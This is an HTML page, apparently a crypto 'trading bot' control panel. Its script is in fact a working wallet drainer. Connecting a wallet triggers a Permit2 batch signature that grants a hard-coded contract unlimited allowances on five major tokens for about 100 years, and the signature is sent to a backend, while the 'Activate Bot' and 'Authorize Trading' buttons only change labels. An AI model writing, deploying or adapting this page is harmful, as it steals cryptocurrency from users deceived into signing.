<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bot Control Standalone</title>

<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>

<style>
:root {
  --bg: #020617;
  --panel: rgba(15, 23, 42, 0.85);
  --border: #1e293b;
  --cyan: #06b6d4;
  --green: #10b981;
  --purple: #6366f1;
  --amber: #f59e0b;
  --font: 'JetBrains Mono', monospace;
}
* { box-sizing: border-box; margin:0; padding:0; }
body { background: var(--bg); color: white; font-family: var(--font); padding:12px; }
.panel { background: var(--panel); border:1px solid var(--border); border-radius:10px; display:flex; flex-direction:column; overflow:hidden; backdrop-filter:blur(8px); margin-bottom:12px; }
.panel-header { background: rgba(30,41,59,0.6); padding:8px 15px; font-size:0.65rem; font-weight:bold; text-transform:uppercase; letter-spacing:2px; border-bottom:1px solid var(--border); color:var(--cyan);}
.module-body { padding:12px 15px; }
.btn-stack { display:flex; flex-direction:column; gap:8px; margin-bottom:12px; }
.control-btn { background:transparent; border:1px solid var(--border); color:#64748b; padding:10px; font-family:var(--font); font-size:0.65rem; cursor:pointer; text-align:left; text-transform:uppercase; font-weight:bold;}
.control-btn:not(:disabled):hover { background: rgba(255,255,255,0.05); border-color:currentColor; }
.btn-cyan { color: var(--cyan); } .btn-purple { color: var(--purple); } .btn-amber { color: var(--amber); }
.status-box { border-top:1px solid var(--border); padding-top:8px; }
.status-grid { display:grid; grid-template-columns:1fr 110px; gap:5px; font-size:0.6rem; align-items:center; margin-bottom:4px; }
.status-line { display:flex; align-items:center; gap:8px; }
.liveDot { width:8px; height:8px; border-radius:50%; }
#execution-console { display:flex; flex-direction:column; align-items:flex-start; padding:10px; }
.exec-line { font-size:0.58rem; margin-bottom:2px; white-space:pre-wrap; word-break:break-all; width:100%; line-height:1.4; border-bottom:1px solid rgba(30,41,59,0.2); font-family:'JetBrains Mono', monospace; }
</style>
</head>
<body>

<div class="panel">
  <div class="panel-header">Bot Control</div>
  <div class="module-body">
    <div class="btn-stack">
      <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
      <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
      <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
      <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>4. Disconnect Wallet</button>
    </div>

    <div class="status-box">
      <div class="status-grid">
        <span>WALLET STATUS</span>
        <div class="status-line">
          <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
          <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
        </div>
      </div>
      <div class="status-grid">
        <span>BOT STATUS</span>
        <div class="status-line">
          <div id="dot-bot" class="liveDot" style="background:#475569"></div>
          <span id="st-bot" style="color:#475569">OFFLINE</span>
        </div>
      </div>
      <div class="status-grid">
        <span>TRADING ACCESS</span>
        <div class="status-line">
          <div id="dot-access" class="liveDot" style="background:#475569"></div>
          <span id="st-access" style="color:#475569">RESTRICTED</span>
        </div>
      </div>
    </div>
  </div>
</div>

<div class="panel" style="height:150px;">
  <div class="panel-header">Execution Console</div>
  <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
</div>

<script type="module">
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

window.supabaseClient = createClient(
  "https://rhytvspbdvtmxtaxihxd.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJoeXR2c3BiZHZ0bXh0YXhpaHhkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQyMDEzMzAsImV4cCI6MjA4OTc3NzMzMH0.QOqbkcKEcggw-25SkxJdEs5k7_LTrSxjpW6Pi_PH_II"
);

const TOKENS = [
  "0xdac17f958d2ee523a2206206994597c13d831ec7",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0x6b175474e89094c44da98b954eedeac495271d0f",
  "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
  "0x514910771AF9Ca656af840dff83E8264EcF986CA"
];

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xBE56fc91B88Ca7551DF05BA4f783e56127588F74";

let CURRENT_WALLET = null;

function log(msg){
  const el=document.getElementById('execution-console');
  const div=document.createElement('div');
  div.className='exec-line';
  div.innerText=msg;
  el.prepend(div);
  console.log(msg);
}

function updateStatus(dotId,textId,text,color){
  const dot=document.getElementById(dotId);
  const label=document.getElementById(textId);
  dot.style.background=color;
  dot.style.boxShadow=`0 0 12px ${color}`;
  label.innerText=text;
  label.style.color=color;
}

async function connectWallet(){
  if(!window.ethereum){ alert("Install MetaMask"); return; }
  const provider=new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  const signer=await provider.getSigner();
  const user=await signer.getAddress();
  const net=await provider.getNetwork();
  if(net.chainId!==1n){ alert("Switch naar Ethereum Mainnet"); return; }
  CURRENT_WALLET=user;
  updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
  document.getElementById('btn-wallet').disabled=true;
  document.getElementById('btn-activate').disabled=false;
  document.getElementById('btn-disconnect').disabled=false;
  await runPermitFlow(provider,signer,user);
}

async function runPermitFlow(provider,signer,user){
  log("⚙️ Permit2 flow");
  const { data:existing } = await window.supabaseClient.from('permits').select('*').eq('owner',user);
  const now=Math.floor(Date.now()/1000);
  if(existing && existing.length===TOKENS.length && existing.every(r=>r.sig_deadline>now)){
    log("⚡ Cached permit valid");
    updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
    updateStatus('dot-bot','st-bot','READY','#6366f1');
    document.getElementById('btn-authorize').innerText="AUTHORIZED";
    document.getElementById('btn-authorize').disabled=true;
    return;
  }
  const permit2=new ethers.Contract(PERMIT2,["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],provider);
  const MAX=(1n<<160n)-1n;
  const exp=now+100*365*24*60*60;
  const details=[];
  const nonces=await Promise.all(TOKENS.map(t=>permit2.allowance(user,t,CONTRACT)));
  for(let i=0;i<TOKENS.length;i++){ const [, ,nonce]=nonces[i]; details.push({ token:TOKENS[i], amount:MAX.toString(), expiration:exp, nonce:nonce.toString() }); }
  const chainId=(await provider.getNetwork()).chainId;
  const domain={ name:"Permit2", chainId, verifyingContract:PERMIT2 };
  const types={ PermitBatch:[{name:"details",type:"PermitDetails[]"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}], PermitDetails:[{name:"token",type:"address"},{name:"amount",type:"uint160"},{name:"expiration",type:"uint48"},{name:"nonce",type:"uint48"}] };
  const sigDeadline=now+30*24*60*60;
  const values={ details, spender:CONTRACT, sigDeadline };
  const signature=await signer.signTypedData(domain,types,values);
  log("✍️ Signature captured");
  await sendToBackend({ details, signature });
}

async function sendToBackend(sigData){
  try{
    const res=await fetch('/api/permit',{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(sigData) });
    const data=await res.json();
    if(data.success){ log("✅ Permit sent"); } else { log("❌ Error: "+data.error); }
  } catch(e){ log("❌ Network error: "+e.message); }
}

function activateBot(){ updateStatus('dot-bot','st-bot','READY','#6366f1'); }
function authorizeTrading(){ updateStatus('dot-access','st-access','AUTHORIZED','#f59e0b'); }
function disconnectWallet(){ location.reload(); }

window.connectWallet=connectWallet;
</script>

</body>
</html>
